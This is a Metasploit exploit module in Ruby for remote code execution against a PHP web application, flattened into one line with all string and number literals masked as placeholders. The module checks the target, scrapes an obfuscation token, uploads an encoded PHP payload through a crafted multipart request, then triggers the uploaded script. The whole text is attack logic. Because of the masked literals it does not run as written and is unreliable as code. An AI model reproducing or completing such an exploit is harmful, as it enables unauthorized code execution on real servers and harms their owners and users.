require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = ExcellentRanking include Msf :: Exploit :: Remote :: HttpClient def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > false , <str> = > { <str> = > true , <str> = > { <str> = > <str> , } , <str> = > <int> , } , <str> = > <str> , <str> = > ARCH_PHP , <str> = > [ [ <str> , { } ] ] , <str> = > <str> , <str> = > <int> ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , ] , self . class ) end def check uri = normalize_uri ( datastore [ <str> ] , <str> ) uri << <str> res = send_request_raw ( { <str> = > uri } , <int> ) if ( res and res . body =~ <str> ) return Exploit :: CheckCode :: Appears end return Exploit :: CheckCode :: Safe end def retrieve_obfuscation ( ) end def exploit cmd_php = <str> + payload . encoded + <str> cmdscript = rand_text_alpha_lower ( <int> ) boundary = rand_text_alphanumeric ( <int> ) directory = <str> uri_base = normalize_uri ( datastore [ <str> ] ) uri_base << <str> if uri_base [ - <int> , <int> ] != <str> uri_base << <str> obfuscation_code = nil res = send_request_raw ( { <str> = > uri_base + <str> } , <int> ) if ( res ) if ( res . body =~ <str> ) obfuscation_code = $1 print_status ( <str> obfuscation_code <str> ) else print_error ( <str> ) return end end data = <str> boundary <str> data << <str> cmdscript <str> boundary <str> data << <str> cmdscript <str> data << <str> data << cmd_php data << <str> boundary <str> res = send_request_raw ( { <str> = > uri_base + <str> + directory + <str> obfuscation_code <str> , <str> = > <str> , <str> = > data , <str> = > { <str> = > data . length , <str> = > <str> + boundary , } } , <int> ) if ( res and res . body =~ <str> ) print_status ( <str> cmdscript <str> ) else print_error ( <str> cmdscript <str> ) end print_status ( <str> cmdscript <str> cmdscript <str> ) res = send_request_raw ( { <str> = > uri_base + <str> + directory + <str> } ) res = send_request_cgi ( { <str> = > <str> , <str> = > uri_base + <str> , <str> = > { <str> = > <str> cmdscript <str> , <str> = > <str> , <str> = > <str> cmdscript <str> , <str> = > <str> , <str> = > <str> , <str> = > <str> , <str> = > <str> , <str> = > <str> , } } , <int> ) if ( res and res . body =~ <str> ) print_status ( <str> cmdscript <str> cmdscript <str> ) else print_error ( <str> cmdscript <str> cmdscript <str> ) end print_status ( <str> cmdscript <str> ) uri = normalize_uri ( datastore [ <str> ] ) uri << <str> if uri [ - <int> , <int> ] != <str> uri << directory + cmdscript + <str> res = send_request_raw ( { <str> = > uri } , <int> ) end end 
